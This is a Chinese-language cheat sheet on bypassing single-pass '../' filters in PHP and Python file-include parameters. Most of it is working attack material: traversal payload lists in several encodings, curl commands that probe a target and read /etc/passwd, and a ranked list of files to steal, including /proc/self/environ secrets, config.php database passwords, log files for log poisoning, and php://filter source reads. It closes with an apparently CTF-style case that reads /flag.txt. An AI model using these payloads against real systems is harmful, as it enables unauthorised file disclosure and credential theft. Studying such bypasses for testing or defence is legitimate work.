# 目录穿越过滤绕过 — str_replace单次替换

## 场景

PHP/Python应用使用`str_replace('../', '')`或类似单次替换过滤目录穿越。

## 绕过原理

单次替换: `str_replace('../', '', $input)` 只删除一次`../`

```
输入: ....//....//etc/passwd
删除中间的../: ../../../etc/passwd
```

## 常见绕过payload

```bash
# 单次替换绕过 (最常见)
?file=....//....//....//etc/passwd      # ....// → ../

# URL编码绕过 (取决于服务端解码时机)
?file=..%2f..%2f..%2fetc%2fpasswd       # 如果filter在URL解码前运行
?file=%2e%2e/%2e%2e/etc/passwd          # 如果filter只检查字面..

# 双写绕过 (regex替换)
?file=..././..././etc/passwd            # 删除../后剩余../../

# 空字节 (PHP < 5.3.4)
?file=../etc/passwd%00.php

# 重复替换绕过
?file=....//....//....//etc/passwd      # 多层嵌套

# 不同编码
?file=..%00/..%00/etc/passwd            # 空字节分隔
?file=..%ff/..%ff/etc/passwd            # 高字节
```

## 实战判断

```bash
# 1. 确认过滤机制
curl -s "http://target/?file=../etc/passwd" | grep -i "warning\|error\|include"
# 如果报错显示 include(etc/passwd) → ..被删除了 → 用....//绕过

# 2. 确认目录深度 (从web根到/)
# /var/www/html/ → 需要../../../到达/
# /app/ → 需要../../到达/
# /var/www/ → 需要../../到达/

# 3. 构造payload
curl -s "http://target/?file=....//....//....//etc/passwd" | grep "root:"
```

## 目标文件优先级

```bash
/etc/passwd                    # 确认可读
/etc/hostname                  # 机器名
/proc/self/environ             # 环境变量(可能有密钥)
/proc/self/cmdline             # 启动命令
/var/www/html/index.php        # 源码
/var/www/html/config.php       # 配置(数据库密码)
/var/log/apache2/access.log    # 日志包含(配合User-Agent注入)
php://filter/convert.base64-encode/resource=index.php  # PHP协议读源码
```

## Pitfall: php://filter也需要绕过过滤

```
# 如果filter也检查../
# php://filter本身不含..，所以直接用:
?file=php://filter/convert.base64-encode/resource=index.php

# 但如果需要读上级目录的文件:
?file=php://filter/convert.base64-encode/resource=....//....//config.php
```

## 实战案例: Enterprise OA (2026-05)

- 目标: OA系统入口, `?module=`参数加载PHP文件
- 防护: `$module = str_replace('../', '', $module);` (单次替换)
- 报错确认: `include(../etc/passwd)` → `..`被删除，剩余`etc/passwd`
- 绕过: `?module=....//....//....//flag.txt` → 读取`/flag.txt`
- 多级穿越: `/var/www/html/` → 需要3个`....//` (即`../../../`)到达根目录
